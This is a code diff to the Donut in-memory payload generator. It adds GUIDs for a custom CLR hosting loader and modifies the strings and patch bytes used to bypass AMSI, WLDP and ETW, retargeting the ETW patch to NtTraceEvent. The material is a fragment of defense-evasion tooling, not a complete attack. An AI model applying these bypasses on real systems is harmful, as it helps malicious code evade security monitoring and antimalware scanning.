@@ -95,6 +95,9 @@ static API_IMPORT api_imports[] = {
   
   {MSCOREE_DLL,  "CorBindToRuntime"},
   {MSCOREE_DLL,  "CLRCreateInstance"},
+
+  // Own functions .NET
+  //{SHLWAPI_DLL,  "SHCreateMemStream"},
   
   {OLE32_DLL,    "CoInitializeEx"},
   {OLE32_DLL,    "CoCreateInstance"},
@@ -120,6 +123,38 @@ static API_IMPORT api_imports[] = {
   
   { NULL, NULL }   // last one always contains two NULL pointers
 };
+
+
+// News GUID to define own version Loader .NET
+
+static GUID xCLSID_ICLRRuntimeHost = { 
+  0x90F1A06E, 0x7712, 0x4762, {0x86, 0xB5, 0x7A, 0x5E, 0xBA, 0x6B, 0xDB, 0x02} 
+};
+
+static GUID xIID_ICLRRuntimeHost = { 
+  0x90F1A06C, 0x7712, 0x4762, {0x86, 0xB5, 0x7A, 0x5E, 0xBA, 0x6B, 0xDB, 0x02 
+}};
+
+static GUID xIID_ICLRAssemblyIdentityManager = { 
+  0x15f0a9da, 0x3ff6, 0x4393, {0x9d, 0xa9, 0xfd, 0xfd, 0x28, 0x4e, 0x69, 0x72} 
+};
+
+static GUID xIID_IHostControl = { 
+  0x02CA073C, 0x7079, 0x4860, {0x88, 0x0A, 0xC2, 0xF7, 0xA4, 0x49, 0xC9, 0x91} 
+};
+
+static GUID xIID_IHostAssemblyManager = { 
+  0x613dabd7, 0x62b2, 0x493e, {0x9e, 0x65, 0xc1, 0xe3, 0x2a, 0x1e, 0x0c, 0x5e} 
+};
+
+static GUID xIID_IHostAssemblyStore = { 
+  0x7b102a88, 0x3f7f, 0x496d, {0x8f, 0xa2, 0xc3, 0x53, 0x74, 0xe0, 0x1a, 0xf3} 
+};
+
+static GUID xIID_IHostMemoryManager = { 
+  0x87640f1a, 0x8d1e, 0x4bc3, {0xba, 0xbb, 0x47, 0xc1, 0xfa, 0x5e, 0x68, 0xc8} 
+};
+
 
 // required to load .NET assemblies
 static GUID xCLSID_CorRuntimeHost = {
@@ -827,7 +862,10 @@ static int build_instance(PDONUT_CONFIG c) {
     
     // Allocate memory for the size of instance based on the type
     DPRINT("Allocating memory for instance");
-    inst_len = sizeof(DONUT_INSTANCE);
+    
+    // bug double module
+    //inst_len = sizeof(DONUT_INSTANCE);
+    inst_len = offsetof(DONUT_INSTANCE, module);
     
     // if the module is embedded, add the size of module
     // that will be appended to the end of structure
@@ -926,6 +964,22 @@ static int build_instance(PDONUT_CONFIG c) {
     if(c->mod_type == DONUT_MODULE_NET_DLL ||
        c->mod_type == DONUT_MODULE_NET_EXE)
     {
+
+      DPRINT("Copying own new GUID structures and DLL strings");
+      strcpy(inst->get_clr, "GetCLRIdentityManager");
+      strcpy(inst->shlwapi, "shlwapi");
+      strcpy(inst->shCreateStream, "SHCreateMemStream");
+
+      memcpy(&inst->xCLSID_ICLRRuntimeHost,              &xCLSID_ICLRRuntimeHost,              sizeof(GUID));
+      memcpy(&inst->xIID_ICLRRuntimeHost,                &xIID_ICLRRuntimeHost,                sizeof(GUID));
+      memcpy(&inst->xIID_ICLRAssemblyIdentityManager,    &xIID_ICLRAssemblyIdentityManager,    sizeof(GUID));
+
+      memcpy(&inst->xIID_IHostControl,             &xIID_IHostControl,             sizeof(GUID));
+      memcpy(&inst->xIID_IHostAssemblyManager,     &xIID_IHostAssemblyManager,     sizeof(GUID));
+      memcpy(&inst->xIID_IHostAssemblyStore,       &xIID_IHostAssemblyStore,       sizeof(GUID));
+      memcpy(&inst->xIID_IHostMemoryManager,       &xIID_IHostMemoryManager,       sizeof(GUID));
+
+
       DPRINT("Copying GUID structures and DLL strings for loading .NET assemblies");
 
       memcpy(&inst->xIID_AppDomain,        &xIID_AppDomain,        sizeof(GUID));
@@ -964,12 +1018,14 @@ static int build_instance(PDONUT_CONFIG c) {
     if(c->bypass != DONUT_BYPASS_NONE) {
       DPRINT("Copying strings required to bypass AMSI");
       
-      strcpy(inst->clr,         "clr");
-      strcpy(inst->amsi,        "amsi");
-      strcpy(inst->amsiInit,    "AmsiInitialize");
-      strcpy(inst->amsiScanBuf, "AmsiScanBuffer");
-      strcpy(inst->amsiScanStr, "AmsiScanString");
-      
+      #ifndef BYPASS_AMSI_A
+        strcpy(inst->amsi,        "amsi");
+        strcpy(inst->amsiInit,    "AmsiInitialize");
+        strcpy(inst->amsiScanBuf, "AmsiScanBuffer");
+        strcpy(inst->amsiScanStr, "AmsiScanString");
+        strcpy(inst->clr,         "clr");
+      #endif
+
       DPRINT("Copying strings required to bypass WLDP");
       
       strcpy(inst->wldp,           "wldp");
@@ -978,10 +1034,11 @@ static int build_instance(PDONUT_CONFIG c) {
 
       DPRINT("Copying strings required to bypass ETW");
       strcpy(inst->ntdll, "ntdll");
-      strcpy(inst->etwEventWrite, "EtwEventWrite");
-      strcpy(inst->etwEventUnregister, "EtwEventUnregister");
+      //strcpy(inst->etwEventWrite, "EtwEventWrite");
+      strcpy(inst->ntraceEvent, "NtTraceEvent");
+      //strcpy(inst->etwEventUnregister, "EtwEventUnregister");
       strcpy(inst->etwRet64, "\xc3");
-      strcpy(inst->etwRet32, "\xc2\x14\x00\x00");
+      strcpy(inst->etwRet32, "\xC2\x10\x00\x00");
     }
     
     // if module is an unmanaged EXE
